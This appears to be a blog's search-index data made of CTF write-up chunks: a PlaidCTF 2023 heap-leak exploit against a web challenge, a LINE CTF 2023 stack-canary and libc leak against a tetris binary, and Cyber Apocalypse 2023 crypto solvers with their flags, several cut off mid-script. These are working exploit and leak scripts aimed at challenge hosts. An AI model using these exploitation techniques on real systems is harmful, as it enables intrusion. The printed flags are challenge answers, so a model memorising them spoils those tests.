createServerAction$(async (f: FormData, { request }) =\u003e { const userId = await requireUserId(request); const action = f.get('action'); if (action === 'buy' || action === 'sell') { const item = f.get('item'); const size = f.get('size'); if (typeof item !== 'string' || typeof size !== 'string') { throw new FormError('Bad submission'); } const dirsign = action === 'buy' ? 1 : -1; const tradewith = action === 'buy' ? 'ask' : 'bid'; const signedSize = dirsign * Number(size); try { await sql.begin(async (sql) =\u003e { await sql` INSERT INTO inventory (user_id, item_id, count) VALUES (${userId}, ${","date":"Apr 17, 2023","objectID":"/posts/plaidctf-2023/:1:1","tags":["Writeup","PlaidCTF","pwn","web","heap","postgresql","collation"],"title":"Plaid CTF 2023","uri":"/posts/plaidctf-2023/"},{"categories":null,"content":"Solution To tackle this challenge, we broke the solution down into three steps: Obtaining useful leak values Triggering the double-fetch bug Obtaining a Reverse Shell through OOB Write Obtaining useful leak values To gain a better understanding of the heap layout within our local environment, I decided to spent a significant amount of time experimenting with the watch and notify APIs so that I could create a reliable POC to get the leak. To start, I set up my own listening server to receive the curl request that was triggered by the webhook binary during the processing of the notify API. It’s important to note that this step was actually quite crucial, as different listening servers can produce different heap layouts. This is because libcurl also uses the heap during the reception of packets from your listening server, meaning that different code within your listening server can produce varying heap layouts. Given my preference for efficiency, I decided to save some time and simply copied the listening server code from a Stack Overflow question :). From there, I made some minor modifications to the code to fit our specific needs. After spending some time experimenting with the challenge, I managed to find a way to obtain a libc and heap leak (with a 50% chance, due to the buggy listening server code that I copied from Stack Overflow). Specifically, I called notify and attempted to force the malloc(n+1) call to reuse the same chunk address within the unsorted bin multiple times. In order to achieve this scenario, I needed to call notify three separate times, each with an increasing size. The first allocation was utilized to set up the initial leak, which was subsequently freed and contained a main_arena address that we could leak in the next allocation. For the second allocation, we utilized the uninitialized data from the previous allocation to leak the main_arena address, which was also subsequently freed and contained a heap address that we could leak in the next allocation. Finally, the third allocation was used to leak the heap address, which was obtained from the uninitialized data within the previous allocation. Here’s the code I used to obtain the leak: import requests from pwn import * import os base_url = 'http://c3cb0aa7-ebd9-45c8-9c3c-e7b4c1b96285.collector.chal.pwni.ng:20000' login_url = f\"{base_url}/_m/2e7970cbec/loggingIn\" transact_url = f\"{base_url}/_m/34a106c003/transacting\" item_map = { \"gold\": \"0\", \"bomb\": \"32\", \"rum\": \"4\", \"anchor\": \"5\", } def create_user(username, password): print(f'create_user {username}') session = requests.Session() data = { \"redirectTo\": \"/\", \"username\": username, \"password\": password, } resp = session.post(login_url, data=data) print(resp.status_code) return session def watch(kind, url, session): print(f'Watch {kind}') data = { \"size\": \"1\", \"item\": item_map[kind], \"kind\": kind, \"url\": url, \"secret\": \"123\", \"action\": \"watch\", } resp = session.post(transact_url, data=data) print(resp.status_code) def unwatch(kind, session): print(f'Unwatch {kind}') data = { \"kind\": kind, \"action\": \"unwatch\", } resp = session.post(transact_url, data=data) print(resp.status_code) def notify(kind, session): print(f'Notify {kind}') data = { \"size\": \"1\", \"item\": item_map[kind], \"kind\": kind, \"action\": \"notify\", } resp = session.post(transact_url, data=data) print(resp.status_code) # Create 3 users # random_hex = os.urandom(5).hex() random_hex = 'd0bebc4a8f' s1 = create_user(f\"user1-{random_hex}\", \"user1\") s2 = create_user(f\"user2-{random_hex}\", \"user2\") s3 = create_user(f\"user3-{random_hex}\", \"user3\") # Clean up hooks db print(\"unwatch...\") unwatch(\"gold\", s1) unwatch(\"gold\", s2) unwatch(\"gold\", s3) unwatch(\"bomb\", s1) unwatch(\"rum\", s1) unwatch(\"anchor\", s1) # Watch gold # Length need to be 0x4ff gold_url_1 = 'http://18.143.50.149:4/?x=__/plugins_____________________________________________________________________________________________________________________________________________________________________","date":"Apr 17, 2023","objectID":"/posts/plaidctf-2023/:1:2","tags":["Writeup","PlaidCTF","pwn","web","heap","postgresql","collation"],"title":"Plaid CTF 2023","uri":"/posts/plaidctf-2023/"},{"categories":null,"content":" LINE CTF 2023 This weekend, I played LINE CTF 2023 with my team Water Paddler. We got the 2nd place. This is my writeup for one of the pwn challenge that we solved together called Hackatris. Pwn ","date":"Mar 26, 2023","objectID":"/posts/line-ctf-2023/:0:0","tags":["Writeup","LINE CTF","pwn","buffer overflow","canary","ROP","2023"],"title":"LINE CTF 2023","uri":"/posts/line-ctf-2023/"},{"categories":null,"content":"Hackatris ","date":"Mar 26, 2023","objectID":"/posts/line-ctf-2023/:1:0","tags":["Writeup","LINE CTF","pwn","buffer overflow","canary","ROP","2023"],"title":"LINE CTF 2023","uri":"/posts/line-ctf-2023/"},{"categories":null,"content":"Initial Analysis We were given a binary called game. Let’s start by running it first. Turns out, it is an implementation of tetris. Some behavior that we notice: The tile of the tetris’ block contains a hex string. Difficulty are changing evertime there is a new tile. It uses ncurse screen, which means parsing it will be very painful later. To understand that behaviors, let’s start disassemble the binary. Below is the interesting functions that we analyzed during working on the challenge: get_bleak // .data:0000000000006138 _system_p dq offset system ... unsigned __int64 get_bleak() { int v1; // [rsp+Ch] [rbp-14h] void *v2; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); v1 = rand() % 6; B_leak_c += 10; B_leak_r = B_leak_c + v1; v2 = system_p; B_leak = (__int64)*(\u0026v2 + v1); qword_65C8 = (__int64)*(\u0026v2 + v1); qword_65D0 = (__int64)*(\u0026v2 + v1); qword_65D8 = (__int64)*(\u0026v2 + v1); B_leak ^= 0x4141414141414141uLL; qword_65C8 ^= 0x4141414141414141uLL; qword_65D0 ^= 0x4141414141414141uLL; qword_65D8 ^= 0x4141414141414141uLL; return v3 - __readfsqword(0x28u); } This is the responsible function that generates the text on the tiles. Turns out, the hex string on the tiles are a leak. Based on that function, the get_bleak the possible value that we can leak from the tiles are: system libc address (if the rand result is 0). canary value (if the rand() result is 1, because if v1 = 1, v2+1 is v3, which is canary). Notes that because all of the tiles have different shapes, the leak that we get from one tile won’t be full (For example, if the shape is cube, the total leaks will be only 4). We need multiple tiles with different shapes but same rand() value in order to retrieve the full value. draw_sidebar int draw_sidebar() { __int16 v0; // ax __int16 v1; // ax int i; // [rsp+Ch] [rbp-24h] int k; // [rsp+10h] [rbp-20h] int j; // [rsp+14h] [rbp-1Ch] __int64 v6; // [rsp+18h] [rbp-18h] __int64 v7; // [rsp+28h] [rbp-8h] for ( i = 0; i \u003c= 2; ++i ) { v6 = Q[2 * i]; v7 = *(_QWORD *)qword_6528[2 * i]; for ( j = 0; j \u003c= 4; ++j ) { for ( k = 0; k \u003c= 4; ++k ) { if ( *(_BYTE *)(5 * j + k + v7) == 98 ) { wattr_on(side_w, 0x40000uLL, 0LL); v0 = to_color_pair((unsigned int)v6); wattr_on(side_w, (unsigned __int16)(v0 \u003c\u003c 8), 0LL); mvwprintw(side_w, 5 * i + j, 2 * k + 1, \" \"); v1 = to_color_pair((unsigned int)v6); wattr_off(side_w, (unsigned __int16)(v1 \u003c\u003c 8), 0LL); wattr_off(side_w, 0x40000uLL, 0LL); } else { mvwprintw(side_w, 5 * i + j, 2 * k + 1, \" \"); } } } } mvwprintw(side_w, 20, 0, \"Difficulty: %d\", (unsigned int)B_leak_r); mvwprintw(side_w, 22, 0, \"Score: %lu\", score); mvwprintw(side_w, 28, 0, \"Move: ASWD or HJKL\"); return wrefresh(side_w); } And then, notice that the Difficulty is actually B_leak_r, which is the rand() value result. So, for each tile that we saw, we actually can know which leak it is by checking the difficulty value shown in the ncurse screen. For example, if the difficulty is 11, that means the rand() value is 1, which means the leaked value printed in the current tile are canary. show_scoreboard unsigned __int64 show_scoreboard() { char v1; // [rsp+3h] [rbp-5Dh] char v2; // [rsp+3h] [rbp-5Dh] char v3; // [rsp+3h] [rbp-5Dh] int v4; // [rsp+4h] [rbp-5Ch] WINDOW *v5; // [rsp+8h] [rbp-58h] char v6[72]; // [rsp+10h] [rbp-50h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); v4 = 0; wtimeout(_bss_start, 30000); echo(); curs_set(1); v5 = newwin(10, 50, 10, 10); wborder(v5, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL); wattr_on(v5, 0x800uLL, 0LL); mvwprintw(v5, 2, 20, \"New record!\"); wattr_off(v5, 0x800uLL, 0LL); mvwprintw(v5, 6, 5, \"Score: %lu\", score); mvwprintw(v5, 7, 5, \"Reward: \"); wrefresh(v5); while ( 1 ) { v1 = wgetch(v5); if ( v1 \u003e 47 \u0026\u0026 v1 \u003c= 57 ) { v2 = v1 - 48; if ( (v4 \u0026 1) != 0 ) v6[v4 / 2] |= v2 \u0026 0xF; else v6[v4 / 2] = 16 * v2; goto LABEL_13; } if ( v1 \u003c= 96 || v1 \u003e 122 ) break; v3 = v1 - 97 + 10; if ( (v4 \u0026 1) != 0 ) v6[v4 / 2] |= v3 \u0026 0xF; else v6[v4 / 2] = 16","date":"Mar 26, 2023","objectID":"/posts/line-ctf-2023/:1:1","tags":["Writeup","LINE CTF","pwn","buffer overflow","canary","ROP","2023"],"title":"LINE CTF 2023","uri":"/posts/line-ctf-2023/"},{"categories":null,"content":"Solution So, to trigger the bug that we found in the initial analysis, we need to recover the leaked data first. However, the binary use ncurse, which is very painful to be processed without a parser or emulator. So, the first step and the hard part is to handle the ncurse output. Handle ncurse We use pyte to handle the ncurse. Below is the example POC script that you can use to parse the ncurse screen. from pwn import * import pyte exe = ELF(\"game_patched\") libc = ELF(\"./libc-2.35.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' # context.log_level = 'DEBUG' warnings.simplefilter(\"ignore\") remote_url = \"35.194.113.63\" remote_port = 10004 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: # gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r os.environ['PWNLIB_NOTERM'] = '1' os.environ['term'] = 'xterm-256color' r = conn() screen = pyte.Screen(100, 500) stream = pyte.ByteStream(screen) while True: b = r.recv() stream.feed(b) cleaned_scr = [] for disp in screen.display[5:35]: cleaned_scr.append(disp[5:]) for row in cleaned_scr: print(row) print() pause() Below is the example result: cleaned_scr will contains the parsed ncurse screen. Now that we know that we can handle ncurse screen with pyte, let’s move to the next step. Collecting Leaked Data To collect the leaked data, we decided to modify the above example script to suit with our use cases. We decided to collect the data like below: Create a parser to parse the ncurse. Add logic to manually move the tiles via input(). Focus on clearing one line first manually, so that the score won’t be zero. And then move the tiles manually and keep the game running until you get the full leaks of canary and libc address Below is the example script that we used to achieve the above strategy: r = conn() ''' Parse ncurse screen to collect leaked bytes while also playing the tetris. We need to clear at least 1 line to be able to input our reward. ''' # Parse ncurse with pyte screen = pyte.Screen(100, 500) stream = pyte.ByteStream(screen) prev_difficulty = 0 curr_idx = 1 need_to_check_leak = -1 found_reward = False stop_move = False rand_val = 10 # Will be used to store the leaked bytes. leaked_map = {} for i in range(6): leaked_map[i] = [0] * 8 leaked_map[0][5] = 0x7f leaked_map[0][0] = 0x60 # Libc system always end with 60 and start with 7f. Need this to speed up the leakage process # Parse ncurse payload while True: b = r.recv(2048) stream.feed(b) # Cleaned scr will parse the received bytes so that it only print the map cleaned_scr = [] for disp in screen.display[5:35]: cleaned_scr.append(disp[5:57]) # Print leaked bytes on each iteration print(f'rand_val: {rand_val}') for key, val in leaked_map.items(): print(f'leaked_map[{key}]: {hex(u64(bytes(val)))}') print(f'-'+'000102030405060708091011121314'+f'-') for row in cleaned_scr: if 'Reward' in row: # Exit the loop, so that we can send our BOF payload found_reward = True print(f'Found reward') print(row) print(f'-'+'000102030405060708091011121314'+f'-') if found_reward: break # Collect difficulty and score try: curr_difficulty = int(cleaned_scr[20].split(' Difficulty: ')[1]) curr_score = int(cleaned_scr[22].split(' Score: ')[1]) except: continue # We don't want to move manually again. That means we've fully recovered the # leak, and want to end the game so that we can get the Reward screen if stop_move: continue # Try to parse tiles, and collect leaked bytes of libc address and canary if prev_difficulty != curr_difficulty: # There is a new tile, Parse it later after the screen buffer is fulfilled need_to_check_leak = 5 rand_val = curr_difficulty - 10*curr_idx prev_difficulty = curr_difficulty curr_idx += 1 elif need_to_check_leak \u003e 0: # Buffer the screen, so that the full tiles are rendered need_to_check_leak -= 1 elif need_to_check_leak == 0: # Time to parse first_leaked_row = -1 last_leaked_row = -1 for row_i, row in enumerate(cleaned","date":"Mar 26, 2023","objectID":"/posts/line-ctf-2023/:1:2","tags":["Writeup","LINE CTF","pwn","buffer overflow","canary","ROP","2023"],"title":"LINE CTF 2023","uri":"/posts/line-ctf-2023/"},{"categories":null,"content":" Cyber Apocalypse 2023 For the past five days, I have been competing solo in the Cyber Apocalypse CTF 2023. During this time, I was able to solve all of the pwn challenges and 10 out of the 11 crypto challenges. In this writeup, I will be sharing my solutions for some of the crypto challenges that I solved. If you’re interested in reading about the pwn challenges, check out my other post. I was able to solve 10 out of 11 crypto challenges Crypto ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:0:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Multipage Recyclings Description As your investigation progressed, a clue led you to a local bar where you met an undercover agent with valuable information. He spoke of a famous astronomy scientist who lived in the area and extensively studied the relic. The scientist wrote a book containing valuable insights on the relic’s location, but encrypted it before he disappeared to keep it safe from malicious intent. The old man disclosed that the book was hidden in the scientist’s house and revealed two phrases that the scientist rambled about before vanishing. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:1:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis For this challenge, we were given two file called source.py and output.txt. Let’s take a look at the source.py first. from Crypto.Cipher import AES from Crypto.Util.Padding import pad import random, os FLAG = b'HTB{??????????????????????}' class CAES: def __init__(self): self.key = os.urandom(16) self.cipher = AES.new(self.key, AES.MODE_ECB) def blockify(self, message, size): return [message[i:i + size] for i in range(0, len(message), size)] def xor(self, a, b): return b''.join([bytes([_a ^ _b]) for _a, _b in zip(a, b)]) def encrypt(self, message): iv = os.urandom(16) ciphertext = b'' plaintext = iv blocks = self.blockify(message, 16) for block in blocks: ct = self.cipher.encrypt(plaintext) encrypted_block = self.xor(block, ct) ciphertext += encrypted_block plaintext = encrypted_block return ciphertext def leak(self, blocks): r = random.randint(0, len(blocks) - 2) leak = [self.cipher.encrypt(blocks[i]).hex() for i in [r, r + 1]] return r, leak def main(): aes = CAES() message = pad(FLAG * 4, 16) ciphertext = aes.encrypt(message) ciphertext_blocks = aes.blockify(ciphertext, 16) r, leak = aes.leak(ciphertext_blocks) with open('output.txt', 'w') as f: f.write(f'ct = {ciphertext.hex()}\\nr = {r}\\nphrases = {leak}\\n') if __name__ == \"__main__\": main() Based on the given source code, the main logic for the code is as follows: Concatenate the flag with itself 4 times. Pad the flag so that it can be split into multiple 16-bytes block Encrypt it with AES Provide some leaks Let’s try to understand the encrypt method first. If you read it, it is actually an implementation of AES-CFB. So, now we know the AES type, let’s take a look at what the leak that the source generates is. It turns out that the given leak was two decrypted blocks that exist in the ciphertext. Therefore, given the leaks, our target is to somehow recover our flag. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:1:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Please refer to the image above. As you can see, to decrypt the plaintext, what AES-CFB does is actually like this, $$ p_i = C(c_{i-1}) \\oplus c_{i} $$ where $C$ is the block cipher encryption, $c$ is the ciphertext, and $p$ is the plaintext. Notice that the leak is actually the $C(c_{i-1})$ result, where $i$ is random. Additionally, the given leak is always two consecutive blocks, and if we have the $C(c_{i-1})$ and $C(c_{i})$, we can actually get the plaintext block for at least two blocks. After testing to XOR the blocks one by one, I found that the leak is $C(c_3)$ and $C(c_4)$. By XORing them with $c_4$ and $c_5$, respectively, we were able to obtain the flag. Full Script from pwn import * def blockify(message, size): return [message[i:i + size] for i in range(0, len(message), size)] ct = bytes.fromhex('bc9bc77a809b7f618522d36ef7765e1cad359eef39f0eaa5dc5d85f3ab249e788c9bc36e11d72eee281d1a645027bd96a363c0e24efc6b5caa552b2df4979a5ad41e405576d415a5272ba730e27c593eb2c725031a52b7aa92df4c4e26f116c631630b5d23f11775804a688e5e4d5624') ct_blocks = blockify(ct, 16) leak_3 = bytes.fromhex('8b6973611d8b62941043f85cd1483244') leak_4 = bytes.fromhex('cf8f71416111f1e8cdee791151c222ad') print(xor(ct_blocks[4], leak_3)) print(xor(ct_blocks[5], leak_4)) Flag: HTB{CFB_15_w34k_w34k_w17h_l34kz} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:1:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Inside the Matrix Description As you deciphered the Matrix, you discovered that the astronomy scientist had observed that certain stars were not real. He had created two 5x5 matrices with values based on the time the stars were bright, but after some time, the stars stopped emitting light. Nonetheless, he had managed to capture every matrix until then and created an algorithm that simulated their generation. However, he could not understand what was hidden behind them as he was missing something. He believed that if he could understand the stars, he would be able to locate the secret tombs where the relic was hidden. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:2:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis For this challenge, we were given a file called server.py. Let’s check that. from sage.all_cmdline import * # from utils import ascii_print import os FLAG = b\"HTB{????????????????????}\" assert len(FLAG) == 25 class Book: def __init__(self): self.size = 5 self.prime = None def parse(self, pt: bytes): pt = [b for b in pt] return matrix(GF(self.prime), self.size, self.size, pt) def generate(self): key = os.urandom(self.size**2) return self.parse(key) def rotate(self): self.prime = random_prime(2**6, False, 2**4) def encrypt(self, message: bytes): self.rotate() key = self.generate() message = self.parse(message) ciphertext = message * key return ciphertext, key def menu(): print(\"Options:\\n\") print(\"[L]ook at page\") print(\"[T]urn page\") print(\"[C]heat\\n\") option = input(\"\u003e \") return option def main(): book = Book() ciphertext, key = book.encrypt(FLAG) page_number = 1 while True: option = menu() if option == \"L\": # ascii_print(ciphertext, key, page_number) print(ciphertext, key, page_number) elif option == \"T\": ciphertext, key = book.encrypt(FLAG) page_number += 2 print() elif option == \"C\": print(f\"\\n{list(ciphertext)}\\n{list(key)}\\n\") else: print(\"\\nInvalid option!\\n\") if __name__ == \"__main__\": try: main() except Exception as e: print(f\"An error occurred: {e}\") Reading through the code, there are three menus that we can interact with: L, which prints the ciphertext, key, and page_number T, which encrypts the FLAG and stores the encryption result to ciphertext and key C, which is the same as L, but prints it as a list format. The encryption scheme is as follows: Parse the FLAG to a matrix 5x5 under GF(prime). prime is randomized from range ($2^4$ - $2^6$) Generate random key and parse it to matrix 5x5 under GF(P). Do matrix multiplication between parsed FLAG and the parsed key. Return the encryption result and the key itself. Note that the server doesn’t return the value of prime. Therefore, the task for this challenge is to recover the flag given an encrypted flag and a key. ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:2:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Because we know the key value, we actually can just simply multiple the encrypted flag with the inverse of key. Take a look on the below equations, $$ \\begin{align*} c = mk \\\\ mkk^{-1} = ck^{-1} \\\\ m = ck^{-1}\\\\ \\end{align*} $$ where $m$ is message, $c$ is encryted message, and $k$ is the key. To do the above equation, we need to know the prime value first. Notice that the range is actually small, so we can actually just bruteforce it. The possible primes that is used in this encryption scheme is actually only [17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]. So, by bruteforcing the prime, we can recover the matrix of the parsed FLAG. However, there is a problem with this one. Notice that the parsed matrix elements was reduced with modulo of the chosen prime. The prime is small, which means that the parsed matrix of FLAG each element’s value is actually not the original value of the FLAG char. So, we need to think on how to recover this. The answer is we can use Chinese Remainder Theorem to recover the original FLAG. Notice that if we recover three pairs of ciphertext and key with different prime, after we recover the $m$, we actually can rearrange the value as follows, $$ x_{i,j} = m_{1,i,j} \\mod p_1 \\\\ x_{i,j} = m_{2,i,j} \\mod p_2 \\\\ x_{i,j} = m_{3,i,j} \\mod p_3 \\\\ $$ where $x_{i,j}$ is the original element of FLAG char on the matrix $m[i][j]$, $m_{1,i,j}, m_{2,i,j}, m_{3,i,j}$ is the messages recovered from the three pairs, and $p_1, p_2, p_3$ is the recovered primes. The above setup can be solved with Chinese Remainder Theorem, where the recovered $x$ will be the original char of the FLAG. To summarize, what we need to do to solve this challenge: Recover three reduced messages (in form of matrix) from the three pairs of (ct, key) from the server For each element in the recovered messages, perform CRT. Full Script Below is my full script (sage script): from pwn import * # Based on `self.prime = random_prime(2**6, False, 2**4)` possible_primes = [17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61] while True: print(f'Try to bruteforce...') # r = remote(b'159.65.86.238', int(32021)) r = process(['python3', 'server.py']) # Collect 3 pair of cts and keys with hope that all of them are unique. # If not unique, just reconnect. cts = [] keys = [] for i in range(3): r.sendlineafter(b'\u003e ', b'C') r.recvline() ct = eval(r.recvline().strip()) key = eval(r.recvline().strip()) cts.append(ct) keys.append(key) r.sendlineafter(b'\u003e ', b'T') # We will bruteforce the possible primes for p0 in possible_primes: for p1 in possible_primes: for p2 in possible_primes: if p0 == p1 or p0 == p2 or p1 == p2: continue primes = [p0, p1, p2] msgs = [] for i in range(3): try: # Try to calculate msg by doing ct*key^-1 mat_ct = Matrix(GF(primes[i]), cts[i]) mat_key = Matrix(GF(primes[i]), keys[i]) msgs.append(mat_ct * mat_key.inverse()) except: # If failed, that means the inverse is failed, # which mean we used the wrong prime pass if len(msgs) \u003c 3: # Continue to bruteforce the correct primes continue ''' Now, we have this equations x = msgs[0][i][j] mod primes[0] x = msgs[1][i][j] mod primes[1] x = msgs[2][i][j] mod primes[2] Do CRT to retrieve x, which is the character of the flag ''' test_m_arr = [] for chr_idx in range(25): test_m = [] for msg_idx in range(len(msgs)): i = chr_idx // 5 j = chr_idx % 5 test_m.append(int(msgs[msg_idx][i][j])) test_m_arr.append(test_m) flag = '' for test_m in test_m_arr: flag_char = crt(test_m, primes) flag += chr(flag_char) if 'HTB' in flag: # We found the flag print(flag) exit() Flag: HTB{l00k_@t_7h3_st4rs!!!} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:2:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Elliptic Labyrinth Description As you navigate through the labyrinth inside the tomb, you encounter GPS inaccuracies that make it difficult to determine the correct path to the exit. Can you overcome the technical issues and use your instincts to find your way out of the maze? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:3:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis For this challenge, we were given a file called server.py. The provided code is shown below. import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad from sage.all_cmdline import * # from secret import FLAG FLAG = b'flag{fake_flag}' class ECC: def __init__(self, bits): self.p = getPrime(bits) self.a = randint(1, self.p) self.b = randint(1, self.p) def gen_random_point(self): return EllipticCurve(GF(self.p), [self.a, self.b]).random_point() def menu(): print(\"1. Get parameters of path\") print(\"2. Get point in path\") print(\"3. Try to exit the labyrinth\") option = input(\"\u003e \") return option def main(): ec = ECC(512) print(f'{ec.p = }') print(f'{ec.a = }') print(f'{ec.b = }') while True: choice = menu() if choice == '1': r = randint(ec.p.bit_length() // 3, 2 * ec.p.bit_length() // 3) print( json.dumps({ 'p': hex(ec.p), 'a': hex(ec.a \u003e\u003e r), 'b': hex(ec.b \u003e\u003e r) })) elif choice == '2': A = ec.gen_random_point() print(json.dumps({'x': hex(A[0]), 'y': hex(A[1])})) elif choice == '3': iv = os.urandom(16) key = sha256(long_to_bytes(pow(ec.a, ec.b, ec.p))).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) flag = pad(FLAG, 16) print( json.dumps({ 'iv': iv.hex(), 'enc': cipher.encrypt(flag).hex() })) else: print('Bye.') exit() if __name__ == '__main__': main() Upon analyzing the given code, we can deduce that this is an ECC (Elliptic Curve) challenge. When we connect to the server, we are presented with three menus: The first one is used to dump some information related to the ECC parameters, which includes: $p$ $a_{msb}$ (a \u003e\u003e r) where r is a random number within the range of p.bit_length()/3 until 2*p.bit_length()/3 $b_{msb}$ (b \u003e\u003e r) The second menu allows us to generate a random point on the curve. The third menu allows us to dump the encrypted flag (with AES), where the AES key is encrypted with the key sha256(long_to_bytes(pow(ec.a, ec.b, ec.p))).digest()[:16]. Therefore, based on our initial analysis, our objective in this challenge is to recover the ECC parameters (a, b, p). ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:3:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Solution Well, we can recover p from the first menu as it is provided. Now, we need to recover a and b. It’s important to remember that the equation for the ECC curve is as follows: $$ y^2 = x^3 + ax + b \\mod p $$ Now, remember that from the second menu, we can generate many points that reside on the curve. As you can see, if we have two points, it becomes two equations with two unknown variables, which are solvable (and for this challenge, we actually don’t need the leak of a and b at all!). So, to recover the a and b, we just need to recover two points, and then subtract it to remove a. See below equations: $$ \\begin{align} y_1^2 = x_1^3 + ax_1 + b \\mod p \\\\ y_2^2 = x_2^3 + ax_2 + b \\mod p \\\\ \\end{align} $$ If we subtract the above equations, we will get a new equation as follows $$ \\begin{align} (y_1^2 - y_2^2) = (x_1^3 -x_2^3) + a(x_1-x_2) \\mod p \\\\ ((y_1^2 - y_2^2) - (x_1^3 -x_2^3))(x_1-x_2)^{-1} = a \\mod p \\\\ \\end{align} $$ Now that we can recover a from the above equation, recovering b becomes trivial. $$ b = y^2 - x^3 - a*x $$ Once we have recovered a and b, we can retrieve the AES key and use it to decrypt the encrypted flag. The following is the solver that can be used to do that (sage script): from pwn import * import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, long_to_bytes from Crypto.Cipher import AES from Crypto.Util.Padding import pad r = remote(b'167.71.143.44', int(31762)) r.sendlineafter(b'\u003e ', b'1') out = json.loads(r.recvline().strip()) p = int(out['p'], 16) partial_a = int(out['a'], 16) partial_b = int(out['b'], 16) xy_data = [] for i in range(2): r.sendlineafter(b'\u003e ', b'2') xy_out = json.loads(r.recvline().strip()) xy_data.append([int(xy_out['x'], 16), int(xy_out['y'], 16)]) r.sendlineafter(b'\u003e ', b'3') enc_out = json.loads(r.recvline().strip()) iv = bytes.fromhex(enc_out['iv']) enc = bytes.fromhex(enc_out['enc']) ''' y1^2 = x1^3 + a*x1 + b mod p y2^2 = x2^3 + a*x2 + b mod p ----------------------------- subtract (y1^2 - y2^2) = (x1^3 -x2^3) + a*(x1-x2) mod p ((y1^2 - y2^2) - (x1^3 -x2^3))*(x1-x2)^-1 = a mod p ''' x1, y1 = xy_data[0] x2, y2 = xy_data[1] sol_a = (((y1^2 - y2^2) - (x1^3 -x2^3))*inverse_mod(x1-x2, p)) % p sol_b = (y1^2 - x1^3 - sol_a*x1) % p print(f'{sol_a = }') print(f'{sol_b = }') key = sha256(long_to_bytes(pow(int(sol_a), int(sol_b), p))).digest()[:16] cipher = AES.new(key, AES.MODE_CBC, iv) print(f'Flag: {cipher.decrypt(enc)}') Flag: HTB{d3fund_s4v3s_th3_d4y!} ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:3:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Elliptic Labyrinth Revenge Description As you navigate through the labyrinth inside the tomb, you encounter GPS inaccuracies that make it difficult to determine the correct path to the exit. Can you overcome the technical issues and use your instincts to find your way out of the maze? ","date":"Mar 23, 2023","objectID":"/posts/cyber-apocalypse-2023-crypto/:4:0","tags":["Writeup","Cyber Apocalypse","htb","crypto","md5","sha256","schnorr","ecc","coppersmith","lattice","LLL"],"title":"Cyber Apocalypse 2023: Crypto","uri":"/posts/cyber-apocalypse-2023-crypto/"},{"categories":null,"content":"Initial Analysis This is the revenge of the previous challenge. The only difference is that in the previous challenge, we could retrieve multiple points, but for this challenge, we can only retrieve one point. import os, json from hashlib import sha256 from random import randint from Crypto.Util.number import getPrime, 